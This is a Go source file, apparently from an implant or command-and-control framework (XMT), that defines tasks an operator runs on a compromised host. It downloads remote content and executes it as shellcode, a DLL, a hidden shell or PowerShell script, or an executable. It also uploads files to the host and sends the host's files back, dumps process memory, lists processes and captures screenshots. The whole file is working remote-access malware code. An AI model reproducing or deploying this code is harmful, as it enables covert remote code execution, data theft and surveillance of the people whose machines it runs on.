package task

import (
	"context"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/device/screen"
	"github.com/iDigitalFlame/xmt/man"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/crypt"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

const (
	timeout = time.Second * 15

	regOpLs  uint8 = 0
	regOpGet uint8 = iota
	regOpMake
	regOpDeleteKey
	regOpDelete
	regOpSet
	regOpSetString
	regOpSetDword
	regOpSetQword
	regOpSetBytes
	regOpSetExpandString
	regOpSetStringList
)

var client struct {
	sync.Once
	v *http.Client
}

type backer interface {
	Payload() []byte
}

// Callable is an internal interface used to specify a wide range of Runnabale
// types that can be Marshaled into a Packet.
//
// Currently the DLL, Zombie, Assembly and Process instances are supported.
type Callable interface {
	task() uint8
	MarshalStream(data.Writer) error
}

func (DLL) task() uint8 {
	return TvDLL
}
func (Zombie) task() uint8 {
	return TvZombie
}
func (Process) task() uint8 {
	return TvExecute
}
func (Assembly) task() uint8 {
	return TvAssembly
}
func rawParse(r string) (*url.URL, error) {
	var (
		i   = strings.IndexRune(r, '/')
		u   *url.URL
		err error
	)
	if i == 0 && len(r) > 2 && r[1] != '/' {
		u, err = url.Parse("/" + r)
	} else if i == -1 || i+1 >= len(r) || r[i+1] != '/' {
		u, err = url.Parse("//" + r)
	} else {
		u, err = url.Parse(r)
	}
	if err != nil {
		return nil, err
	}
	if len(u.Host) == 0 {
		return nil, xerr.Sub("empty host field", 0x9)
	}
	if u.Host[len(u.Host)-1] == ':' {
		return nil, xerr.Sub("invalid port specified", 0xE)
	}
	if len(u.Scheme) == 0 {
		u.Scheme = crypt.HTTP
	}
	return u, nil
}
func request(u string, r *http.Request) (*http.Response, error) {
	client.Do(func() {
		client.v = &http.Client{
			Transport: &http.Transport{
				Proxy:                 device.Proxy,
				DialContext:           (&net.Dialer{Timeout: timeout, KeepAlive: timeout, DualStack: true}).DialContext,
				MaxIdleConns:          64,
				IdleConnTimeout:       timeout,
				DisableKeepAlives:     true,
				ForceAttemptHTTP2:     false,
				TLSHandshakeTimeout:   timeout,
				ExpectContinueTimeout: timeout,
				ResponseHeaderTimeout: timeout,
			},
		}
	})
	var err error
	if r.URL, err = rawParse(u); err != nil {
		return nil, err
	}
	return client.v.Do(r)
}
func taskPull(x context.Context, r data.Reader, w data.Writer) error {
	u, err := r.StringVal()
	if err != nil {
		return err
	}
	p, err := r.StringVal()
	if err != nil {
		return err
	}
	var (
		h, _ = http.NewRequestWithContext(x, http.MethodGet, "*", nil)
		o    *http.Response
	)
	if o, err = request(u, h); err != nil {
		return err
	}
	var (
		v = device.Expand(p)
		f *os.File
	)
	if f, err = os.OpenFile(v, 0x242, 0755); err != nil {
		o.Body.Close()
		return err
	}
	n, err := f.ReadFrom(o.Body)
	o.Body.Close()
	w.WriteString(v)
	w.WriteInt64(n)
	return err
}
func taskUpload(x context.Context, r data.Reader, w data.Writer) error {
	s, err := r.StringVal()
	if err != nil {
		return err
	}
	var (
		v = device.Expand(s)
		f *os.File
	)
	if f, err = os.OpenFile(v, 0x242, 0644); err != nil {
		return err
	}
	n := data.NewCtxReader(x, r)
	c, err := io.Copy(f, n)
	n.Close()
	f.Close()
	w.WriteString(v)
	w.WriteInt64(c)
	return err
}
func taskDownload(x context.Context, r data.Reader, w data.Writer) error {
	s, err := r.StringVal()
	if err != nil {
		return err
	}
	var (
		v = device.Expand(s)
		i os.FileInfo
	)
	if i, err = os.Stat(v); err != nil {
		return err
	}
	if w.WriteString(v); i.IsDir() {
		w.WriteBool(true)
		w.WriteInt64(0)
		return nil
	}
	w.WriteBool(false)
	w.WriteInt64(i.Size())
	f, err := os.OpenFile(v, 0, 0)
	if err != nil {
		return err
	}
	n := data.NewCtxReader(x, f)
	_, err = io.Copy(w, n)
	n.Close()
	return err
}
func taskPullExec(x context.Context, r data.Reader, w data.Writer) error {
	u, err := r.StringVal()
	if err != nil {
		return err
	}
	z, err := r.Bool()
	if err != nil {
		return err
	}
	var f *filter.Filter
	if err = filter.UnmarshalStream(r, &f); err != nil {
		return err
	}
	e, p, err := WebResource(x, w, z, u)
	if err != nil {
		if len(p) > 0 {
			os.Remove(p)
		}
		return err
	}
	e.SetParent(f)
	if err = e.Start(); err != nil {
		if len(p) > 0 {
			os.Remove(p)
		}
		return err
	}
	if !z {
		if w.WriteUint64(uint64(e.Pid()) << 32); len(p) > 0 {
			go func() {
				if bugtrack.Enabled {
					defer bugtrack.Recover("task.taskPullExec.func1()")
				}
				e.Wait()
				os.Remove(p)
			}()
		}
		return nil
	}
	i := e.Pid()
	if err = e.Wait(); len(p) > 0 {
		os.Remove(p)
	}
	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
		return err
	}
	var (
		c, _ = e.ExitCode()
		s    = w.(backer)
		//     ^ This should NEVER panic!
	)
	o := s.Payload()
	o[0], o[1], o[2], o[3] = byte(i>>24), byte(i>>16), byte(i>>8), byte(i)
	o[4], o[5], o[6], o[7] = byte(c>>24), byte(c>>16), byte(c>>8), byte(c)
	return nil
}
func taskProcDump(_ context.Context, r data.Reader, w data.Writer) error {
	var f *filter.Filter
	if err := filter.UnmarshalStream(r, &f); err != nil {
		return err
	}
	return device.DumpProcess(f, w)
}
func taskProcList(_ context.Context, _ data.Reader, w data.Writer) error {
	e, err := cmd.Processes()
	if err != nil {
		return err
	}
	if err = w.WriteUint32(uint32(len(e))); err != nil {
		return err
	}
	if len(e) == 0 {
		return nil
	}
	for i := range e {
		if err = e[i].MarshalStream(w); err != nil {
			return err
		}
	}
	return nil
}
func taskScreenShot(_ context.Context, _ data.Reader, w data.Writer) error {
	return screen.Capture(w)
}

// WebResource will attempt to download the URL target at 'u' and parse the
// data into a Runnable interface.
//
// The passed Writer will be passed as Stdout/Stderr to certain processes if
// the 'z' flag is true.
//
// The returned string is the full expanded path if a temporary file is created.
// It's the callers responsibility to delete this file when not needed.
//
// This function uses the 'man.ParseDownloadHeader' function to assist with
// determining the executable type.
func WebResource(x context.Context, w data.Writer, z bool, u string) (cmd.Runnable, string, error) {
	var (
		r, _   = http.NewRequestWithContext(x, http.MethodGet, "*", nil)
		o, err = request(u, r)
	)
	if err != nil {
		return nil, "", err
	}
	b, err := io.ReadAll(o.Body)
	if o.Body.Close(); err != nil {
		return nil, "", err
	}
	if bugtrack.Enabled {
		bugtrack.Track("task.WebResource(): Download u=%s", u)
	}
	var d bool
	switch man.ParseDownloadHeader(o.Header) {
	case 1:
		d = true
	case 2:
		if bugtrack.Enabled {
			bugtrack.Track("task.WebResource(): Download is shellcode u=%s", u)
		}
		return cmd.NewAsmContext(x, b), "", nil
	case 3:
		c := cmd.NewProcessContext(x, device.Shell, device.ShellArgs, string(b))
		if c.SetWindowDisplay(0); z {
			c.Stdout, c.Stderr = w, w
		}
		return c, "", nil
	case 4:
		c := cmd.NewProcessContext(x, device.PowerShell, pwsh, string(b))
		if c.SetWindowDisplay(0); z {
			c.Stdout, c.Stderr = w, w
		}
		return c, "", nil
	}
	var n string
	if d {
		n = execB
	} else if device.OS == device.Windows {
		n = execC
	} else {
		n = execA
	}
	f, err := os.CreateTemp("", n)
	if err != nil {
		return nil, "", err
	}
	n = f.Name()
	_, err = f.Write(b)
	if f.Close(); err != nil {
		return nil, n, err
	}
	if bugtrack.Enabled {
		bugtrack.Track("task.WebResource(): Download to tempfile u=%s, n=%s", u, n)
	}
	if os.Chmod(n, 0755); d {
		return cmd.NewDllContext(x, n), n, nil
	}
	c := cmd.NewProcessContext(x, n)
	if c.SetWindowDisplay(0); z {
		c.Stdout, c.Stderr = w, w
	}
	return c, n, nil
}
